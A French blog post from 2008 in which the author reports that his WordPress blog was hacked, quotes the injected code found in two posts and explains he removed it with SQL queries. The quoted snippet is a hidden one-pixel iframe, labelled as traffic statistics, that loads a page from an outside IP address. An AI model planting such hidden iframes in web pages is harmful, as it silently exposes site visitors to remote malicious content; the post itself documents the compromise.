---
id: 515
disqus_id: 515 http://regis.decamps.info/blog/?p=515
title: 'Ce blog s’est fait kacker'
date: 2008-05-12T23:41:08+00:00
layout: post
guid: http://regis.decamps.info/blog/2008/05/ce-blog-sest-fait-kacker/
permalink: /blog/2008/05/ce-blog-sest-fait-kacker/

dsq_thread_id:
  - "564520470"
categories:
  - Hightech
  - Misc
tags:
  - Misc
  - Sécurité
---
Attention, mon blog a été hacké.

Google indiquait que mon blog était `potentiellement dangereux’. J’ai d’abord cru qu’ils avaient fumé ; mais en fait non. 

Par exemple, quelques posts contenaient
  
```
<!-- Traffic Statistics --> <iframe src=http://xx.155.8.157/iframe/wp-stats.php width=1 height=1 frameborder=0></iframe> <!-- End Traffic Statistics -->
```


WordPress a connu un certain nombre de failles de sécurité, et j’ai un peu de mal à suivre les mises à jour. 

J’ai fait le ménage à coup de requêtes SQL. Deux articles étaient concernés:

  * <http://regis.decamps.info/blog/2008/04/liso-approve-loffice-open-xml/>
  * <http://regis.decamps.info/blog/2007/10/boutique-ferrari/>
